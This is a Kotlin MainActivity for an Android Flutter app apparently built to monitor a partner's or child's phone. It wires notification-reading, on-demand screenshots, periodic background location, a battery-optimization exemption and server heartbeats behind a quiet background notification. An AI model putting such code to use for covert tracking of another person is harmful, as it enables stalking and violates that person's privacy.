package com.example.couple_guard_child

import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import com.example.couple_guard_child.services.background.MyNotificationListenerService
import com.example.couple_guard_child.services.background.ScreenCaptureForegroundService
import com.example.couple_guard_child.workers.LocationWorkManager

class MainActivity: FlutterActivity() {
    private val CHANNEL = "notification_listener_channel"
    private val LOCATION_CHANNEL = "location_worker_channel"
    private val SCREEN_CAPTURE_CHANNEL = "screen_capture_permission_channel"
    private val TAG = "MainActivity"
    
    private val REQUEST_CODE_SCREEN_CAPTURE = 1001
    private var screenCaptureResult: MethodChannel.Result? = null

    companion object {
        const val NOTIFICATION_CHANNEL_ID = "child_app_background"
        const val NOTIFICATION_CHANNEL_NAME = "Background Service"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        Log.d(TAG, "========================================")
        Log.d(TAG, "MainActivity onCreate()")
        
        createNotificationChannel()
        
        Log.d(TAG, "✅ Notification channel created")
        Log.d(TAG, "========================================")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                
                val backgroundChannel = NotificationChannel(
                    NOTIFICATION_CHANNEL_ID,
                    NOTIFICATION_CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Keeps the app running in background for family safety"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                
                val geofenceChannel = NotificationChannel(
                    "geofence_alerts",
                    "Geofence Alerts",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Alerts when device leaves geofence area"
                    enableLights(true)
                    enableVibration(true)
                    setShowBadge(true)
                }
                
                notificationManager.createNotificationChannel(backgroundChannel)
                notificationManager.createNotificationChannel(geofenceChannel)
                
                Log.d(TAG, "✅ Notification channels created")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to create notification channels", e)
            }
        }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        
        Log.d(TAG, "Configuring Flutter Engine")
        
        // Notification channel
        val notifChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger, 
            CHANNEL
        )
        
        MyNotificationListenerService.methodChannel = notifChannel
        Log.d(TAG, "✅ Notification MethodChannel registered")
        
        notifChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "checkNotificationPermission" -> {
                    val enabled = isNotificationServiceEnabled()
                    result.success(enabled)
                }
                "openNotificationSettings" -> {
                    openNotificationListenerSettings()
                    result.success(null)
                }
                "minimizeApp" -> {
                    moveTaskToBack(true)
                    result.success(null)
                }
                "requestProjection" -> {
                    val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                    startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE)
                    screenCaptureResult = result
                }
                "isAccessibilityEnabled" -> {
                    val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0) == 1
                    result.success(enabled)
                }
                "sendHeartbeat" -> {
                    Log.d(TAG, "💓 Sending heartbeat to server")
                    try {
                        val success = com.example.couple_guard_child.utils.ApiClient.updateDeviceStatus(
                            applicationContext,
                            true
                        )
                        result.success(success)
                        Log.d(TAG, if (success) "✅ Heartbeat sent" else "⚠️ Heartbeat failed")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to send heartbeat", e)
                        result.error("HEARTBEAT_ERROR", e.message, null)
                    }
                }
                "checkBatteryOptimization" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                        val isIgnoring = powerManager.isIgnoringBatteryOptimizations(packageName)
                        result.success(isIgnoring)
                    } else {
                        result.success(true)
                    }
                }
                "requestBatteryOptimization" -> {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                            intent.data = android.net.Uri.parse("package:$packageName")
                            startActivity(intent)
                            result.success(null)
                        } catch (e: Exception) {
                            result.error("ERROR", e.message, null)
                        }
                    } else {
                        result.success(null)
                    }
                }
                else -> result.notImplemented()
            }
        }
        
        // Location channel
        val locationChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            LOCATION_CHANNEL
        )
        
        locationChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "startPeriodicLocation" -> {
                    Log.d(TAG, "========================================")
                    Log.d(TAG, "📍 START PERIODIC LOCATION REQUEST")
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                        val isIgnoring = powerManager.isIgnoringBatteryOptimizations(packageName)
                        
                        Log.d(TAG, "Battery optimization ignored: $isIgnoring")
                        
                        if (!isIgnoring) {
                            Log.w(TAG, "⚠️ WARNING: Battery optimization NOT disabled!")
                        }
                    }
                    
                    LocationWorkManager.schedulePeriodicLocationUpdates(applicationContext)
                    
                    Handler(Looper.getMainLooper()).postDelayed({
                        val isScheduled = LocationWorkManager.isWorkScheduled(applicationContext)
                        val status = LocationWorkManager.getWorkStatus(applicationContext)
                        Log.d(TAG, "Verification - Scheduled: $isScheduled")
                        Log.d(TAG, "Verification - Status: $status")
                    }, 1000)
                    
                    Log.d(TAG, "========================================")
                    result.success(true)
                }
                "stopPeriodicLocation" -> {
                    Log.d(TAG, "🛑 Stopping periodic location updates")
                    LocationWorkManager.cancelPeriodicLocationUpdates(applicationContext)
                    result.success(true)
                }
                "isLocationWorkScheduled" -> {
                    val isScheduled = LocationWorkManager.isWorkScheduled(applicationContext)
                    Log.d(TAG, "Location work scheduled: $isScheduled")
                    result.success(isScheduled)
                }
                "getLocationWorkStatus" -> {
                    val status = LocationWorkManager.getWorkStatus(applicationContext)
                    Log.d(TAG, "Location work status: $status")
                    result.success(status)
                }
                else -> result.notImplemented()
            }
        }
        
        Log.d(TAG, "✅ Location MethodChannel registered")
        
        // Screen capture permission channel
        val screenCaptureChannel = MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            SCREEN_CAPTURE_CHANNEL
        )
        
        screenCaptureChannel.setMethodCallHandler { call, result ->
            when (call.method) {
                "requestProjection" -> {
                    requestProjectionPermission()
                    result.success(true)
                }
                "setDeviceId" -> {
                    val deviceId = (call.argument<String>("deviceId") ?: "")
                    NativeBridge.setDeviceId(this, deviceId)
                    result.success(true)
                }
                "takeScreenshotNow" -> {
                    ScreenCaptureForegroundService.enqueueAction(this, ScreenCaptureForegroundService.ACTION_TAKE_SCREENSHOT)
                    result.success(true)
                }
                "isProjectionActive" -> {
                    result.success(ScreenCaptureForegroundService.isActive())
                }
                else -> result.notImplemented()
            }
        }
        
        Log.d(TAG, "✅ Screen Capture MethodChannel registered")
    }
    
    private fun requestProjectionPermission() {
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = mgr.createScreenCaptureIntent()
        startActivityForResult(intent, REQUEST_CODE_SCREEN_CAPTURE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                // Start foreground service and pass the intent
                val svcIntent = Intent(this, ScreenCaptureForegroundService::class.java).apply {
                    action = ScreenCaptureForegroundService.ACTION_START
                    putExtra(ScreenCaptureForegroundService.EXTRA_RESULT_CODE, resultCode)
                    putExtra(ScreenCaptureForegroundService.EXTRA_RESULT_INTENT, data)
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(svcIntent)
                } else {
                    startService(svcIntent)
                }
                
                Log.d(TAG, "✅ Screen capture service started")
            } else {
                Log.w(TAG, "❌ User denied screen capture permission")
            }
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val pkgName = packageName
        val flat = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        )
        
        if (!flat.isNullOrEmpty()) {
            val enabled = flat.contains(pkgName)
            Log.d(TAG, "Notification listener enabled: $enabled")
            return enabled
        }
        
        return false
    }

    private fun openNotificationListenerSettings() {
        Log.d(TAG, "Opening notification listener settings")
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivity(intent)
    }
}